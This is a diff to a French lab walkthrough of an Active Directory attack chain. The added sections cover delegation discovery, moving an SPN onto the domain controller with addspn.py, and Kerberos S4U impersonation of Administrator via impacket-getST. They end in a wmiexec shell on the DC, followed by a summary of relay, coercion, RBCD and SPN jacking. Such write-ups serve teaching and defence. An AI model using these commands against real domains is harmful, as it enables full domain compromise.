@@ -305,4 +305,137 @@ Le mot de passe du compte `BOB_ADMIN` est correctement changé sans connaître l
 
 ---
 
+## 8. Découverte d'une constrainte delegation
 
+### Principe
+
+En apprendre plus sur ce nouvel utilisateur.
+
+### Commande sur Kali
+
+```
+└─$ impacket-findDelegation lab.domain/bob_admin:newP@ssword2022         
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+AccountName  AccountType  DelegationType                      DelegationRightsTo     SPN Exists 
+-----------  -----------  ----------------------------------  ---------------------  ----------
+DC$          Computer     Unconstrained                       N/A                        Yes        
+bob_admin    Person       Constrained w/ Protocol Transition  http/MACHINE_2.lab.domain  Yes        
+bob_admin    Person       Constrained w/ Protocol Transition  HTTP/MACHINE_2             Yes        
+ATTACKER$    Computer     Resource-Based Constrained          MACHINE_2$                 No
+```
+
+### Résultat
+
+Le compte `BOB_ADMIN` a délégation sur un SPN de `MACHINE_2`, en plus de l'attribut "WriteSPN" sur le DC.
+
+---
+
+## 9. SPN Jacking
+
+### Principe
+
+La modification d’un SPN permet d’influencer les tickets Kerberos
+émis par le contrôleur de domaine.  
+
+Le déplacement du SPN entraîne également un changement implicite
+dans la cible de la délégation contrainte.
+
+En effet, la configuration de *constrained delegation* référence un
+SPN spécifique via l'attribut `msDS-AllowedToDelegateTo`. Lorsque ce
+SPN est déplacé vers un autre objet (ici le contrôleur de domaine),
+la délégation s'applique alors à ce nouveau service.
+
+Ainsi, une délégation initialement prévue pour `MACHINE_2` peut être
+redirigée vers le contrôleur de domaine, ouvrant la voie à une
+impersonation d’utilisateurs à privilèges élevés.
+
+### Outils
+
+Utilisation du script python addsmn.py accessible ici :  
+https://github.com/dirkjanm/krbrelayx/tree/master
+
+### Exploitation
+
+1) Enlever le SPN http/MACHINE_2.lab.domain de `MACHINE_2`
+
+```
+└─$ python addspn.py --clear -t MACHINE_2.lab.domain -u 'lab.domain\bob_admin' -p 'newP@ssword2022' 'DC.lab.domain' 
+```
+
+2) Placer ce SPN sur le contrôleur de domaine
+
+```
+└─$ python addspn.py -t DC.lab.domain --spn "http/MACHINE_2.lab.domain" -u 'lab.domain\bob_admin' -p 'newP@ssword2022' 'DC.lab.domain'
+```
+
+### Résultat
+
+Le SPN est déplacé de `MACHINE_2` vers le contrôleur de domaine.
+
+---
+
+## 9. Impersonation Kerberos
+
+### Objectif
+Obtenir un ticket Kerberos permettant d’agir comme un utilisateur
+à privilèges élevés.
+
+### Principe
+
+La délégation configurée permet de demander un ticket Kerberos
+au nom d’un autre utilisateur.
+
+### Commande
+
+```
+└─$ impacket-getST -spn http/MACHINE_2.lab.domain -impersonate Administrator lab.domain/bob_admin:newP@ssword2022 -altservice "HOST/DC.lab.domain"
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+
+└─$ export KRB5CCNAME=Administrator.ccache
+
+└─$ impacket-wmiexec -k -no-pass DC.lab.domain
+Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>hostname
+DC
+
+C:\>whoami
+lab\administrator                                                                                             
+```
+
+L'option "-altservice" permet de convertir le ticket, permettant ainsi d'executer des commandes sur le contrôleur de domaine.
+
+### Résultat
+
+Accès administrateur sur DC.
+
+---
+## Conclusion
+
+Cette chaîne illustre comment plusieurs mauvaises
+configurations Active Directory peuvent être combinées
+pour transformer un accès limité en compromission
+complète du domaine.
+
+Cette chaine d'attaque combines plusieurs techniques AD :
+
+1️⃣ NTLM relay : Une NTLM Relay Attack consiste à intercepter une authentification NTLM et la relayer vers un autre service pour s’authentifier à la place de la victime. On ne cherche pas à récuperer et à "casser" le hash, on le réutilise en temps réel. 
+
+2️⃣ NTLM Coercion : Forcer une machine à s’authentifier vers l’attaquant. Avec le relay en place, l'authentification est redirigé vers la cible.
+
+3️⃣ Resource‑Based Constrained Delegation (RBCD) : Permet à une machine contrôlée par l’attaquant d’impersoner n’importe quel utilisateur sur une autre machine. Il s'agit d'une forme moderne de délégation Kerberos.
+
+4️⃣ SPN Jacking : Déplacer un Service Principal Name (SPN) d’un objet AD vers un autre, permettant de tromper le KDC sur l'identité du service.
+
+5️⃣ Kerberos S4U Abuse : Exploiter les extensions Kerberos S4U2Self etS4U2Proxy pour impersoner un utilisateur.
